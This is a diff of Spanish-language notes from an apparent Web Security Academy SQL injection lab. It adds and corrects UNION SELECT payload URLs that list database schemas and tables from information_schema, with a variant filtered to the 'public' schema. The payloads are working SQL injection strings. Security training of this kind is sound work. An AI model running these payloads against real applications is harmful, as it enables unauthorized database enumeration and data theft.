@@ -74,17 +74,21 @@ https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '
 
     # OJO!!! `Depende el lado de la inyección irá el "UNION SELECT <--> schema_name"`
 
-## Opt1 - Dump: schema_name = DBs [DUMP = DB = pg_catalog] 
+## Opt1 - Dump: schema_name = DBs 
 https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1',schema_name FROM information_schema.schemata -- -
-## Opt2 - Dump: schema_name = DBs [DUMP = DB = pg_catalog] 
+## Opt2 - Dump: schema_name = DBs
 https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT schema_name,'2' FROM information_schema.schemata -- -
+    ### [DUMP = DB = 1. pg_catalog]
+    ### [DUMP = DB = 2. public]
 
-## Opt1 - Dump: schema_name = DBs [DUMP = DB = pg_catalog] 
-https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT  '1',table_name FROM information_schema.tables WHERE  -- -
-## Opt2 - Dump: schema_name = DBs [DUMP = DB = pg_catalog] 
+## Opt1 - Dump: table_name = Tables (TODAS)
+https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT  '1',table_name FROM information_schema.tables -- -
+## Opt2 - Dump: table_name = Tables (TODAS)
 https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT table_name,'2' FROM information_schema.tables -- -
-
-
+## Opt3 - Dump: table_name = Tables (SOLO database() en este caso 'public')
+https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT  '1',table_name FROM information_schema.tables WHERE table_schema = 'public' -- -
+## Opt4 - Dump: table_name = Tables (SOLO database() en este caso 'public')
+https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT table_name,'2' FROM information_schema.tables WHERE table_schema = 'public' -- -
 ````
 
 
